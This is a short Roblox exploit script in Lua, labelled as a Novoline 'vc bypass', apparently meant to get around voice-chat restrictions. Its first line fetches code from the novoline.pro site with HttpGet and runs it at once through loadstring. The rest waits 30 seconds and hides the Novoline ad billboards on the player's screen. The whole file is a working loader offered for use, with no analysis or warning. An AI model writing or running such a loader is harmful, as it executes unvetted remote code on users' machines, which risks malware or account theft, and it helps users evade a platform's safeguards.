--Novoline, vc bypass
loadstring(game:HttpGet("https://novoline.pro"))()

wait(30)
--Remove novoline ad off all screens

local billboards = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("_client_tag_billboards")

for _, billboard in ipairs(billboards:GetChildren()) do
    if billboard:IsA("BillboardGui") then
        local frame = billboard:FindFirstChild("Frame")
        
        if frame and frame:IsA("Frame") then
            frame.Visible = false
        end
    end
end